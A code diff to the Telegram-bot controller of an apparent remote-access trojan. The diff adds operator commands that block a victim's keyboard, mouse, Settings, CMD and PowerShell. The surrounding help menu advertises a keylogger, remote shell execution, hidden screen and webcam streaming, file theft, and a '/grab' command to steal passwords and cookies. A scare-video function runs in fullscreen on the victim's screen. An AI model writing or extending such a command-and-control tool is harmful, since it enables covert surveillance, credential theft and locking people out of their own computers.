@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - Video now loops and redirect is removed.
+# FINAL VERSION - Added input and process blocking commands.
 
 import os
 import re
@@ -71,12 +71,12 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
         "*AGENT CONTROLLER HELP MENU*\n\n"
         "Use these commands to manage and control your agents\\.\n\n"
-        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
+        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
         "*🎯 CORE COMMANDS*\n"
         "`/list` \\- Show all active agents\n"
         "`/target <id|all|clear>` \\- Set the active agent\n"
         "`/help` \\- Display this help menu\n\n"
-        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
+        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\- \n"
         "*💻 SYSTEM & INFO*\n"
         "`/info` \\- Get detailed system information\n"
         "`/exec <command>` \\- Execute a shell command\n\n"
@@ -90,6 +90,13 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/stoplivestream` \\- Stop the screen stream\n"
         "`/livecam` \\- Start a live webcam stream\n"
         "`/stoplivecam` \\- Stop the webcam stream\n\n"
+        "*🚫 LOCKDOWN & CONTROL*\n"
+        "`/blockkeyboard` \\- Disable keyboard input\n"
+        "`/unblockkeyboard` \\- Enable keyboard input\n"
+        "`/blockmouse` \\- Disable mouse input\n"
+        "`/unblockmouse` \\- Enable mouse input\n"
+        "`/startblocker` \\- Block settings, CMD, PS, etc\n"
+        "`/stopblocker` \\- Stop blocking system tools\n\n"
         "*🔑 DATA EXFILTRATION*\n"
         "`/grab <type>` \\- Steal data \\(passwords, cookies, etc\\.\\)\n\n"
         "*📁 FILE SYSTEM*\n"
@@ -97,7 +104,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/cd <directory>` \\- Change directory\n"
         "`/pwd` \\- Show current directory\n"
         "`/download <file>` \\- Download a file from the agent\n\n"
-        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
+        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
         "*💣 DESTRUCTIVE COMMANDS*\n"
         "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n"
     )
@@ -178,7 +185,12 @@ ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("list", cmd_list))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
-agent_commands = ["info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", "pwd", "download"]
+agent_commands = [
+    "info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", 
+    "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", 
+    "pwd", "download", "blockkeyboard", "unblockkeyboard", "blockmouse", 
+    "unblockmouse", "startblocker", "stopblocker"
+]
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
@@ -259,8 +271,6 @@ def health_check_and_scare():
                 
                 scareVideo.muted = false;
                 scareVideo.play().catch(e => console.error("Autoplay failed:", e));
-
-                // CHANGE 2: The redirect function that ran at the end of the video has been removed.
                 
                 try {
                     if (scareContainer.requestFullscreen) {
